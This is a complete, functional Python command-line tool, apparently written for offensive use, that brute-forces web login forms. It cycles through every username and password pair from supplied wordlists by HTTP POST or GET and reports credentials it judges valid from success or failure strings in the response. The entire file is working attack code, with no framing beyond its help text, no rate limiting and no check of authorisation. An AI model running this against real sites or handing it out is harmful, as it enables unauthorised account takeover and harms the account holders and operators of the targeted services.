import argparse
import requests
from itertools import product

def main():
    parser = argparse.ArgumentParser(description="Login Brute-Forcer")
    parser.add_argument('url', help="Login form URL")
    parser.add_argument('--user-field', required=True, help="Username field name")
    parser.add_argument('--pass-field', required=True, help="Password field name")
    parser.add_argument('--user-list', required=True, help="Username wordlist")
    parser.add_argument('--pass-list', required=True, help="Password wordlist")
    parser.add_argument('--fail-string', required=True, help="String that appears in response when login fails")
    parser.add_argument('--success-string', help="Optional: String that appears when login succeeds")
    parser.add_argument('--method', default='POST', choices=['POST', 'GET'], help="HTTP method (default: POST)")
    parser.add_argument('--verbose', action='store_true', help="Print every attempt")
    args = parser.parse_args()

    with open(args.user_list) as f:
        users = [line.strip() for line in f if line.strip()]
    with open(args.pass_list) as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(f"[*] Attempting brute-force on: {args.url}")
    total = len(users) * len(passwords)
    print(f"[*] {len(users)} usernames x {len(passwords)} passwords = {total} attempts")

    session = requests.Session()
    found = False

    for username, password in product(users, passwords):
        data = {args.user_field: username, args.pass_field: password}
        if args.method == 'POST':
            resp = session.post(args.url, data=data)
        else:
            resp = session.get(args.url, params=data)
        content = resp.text

        if args.verbose:
            print(f"[ ] Tried {username}:{password}", end='\r')

        # Check for success/failure
        if args.success_string and args.success_string in content:
            print(f"\n[+] SUCCESS: {username}:{password}")
            found = True
            break
        elif args.fail_string not in content:
            print(f"\n[+] POSSIBLE SUCCESS: {username}:{password}")
            found = True
            break
    if not found:
        print("\n[-] No valid credentials found.")

if __name__ == "__main__":
    main()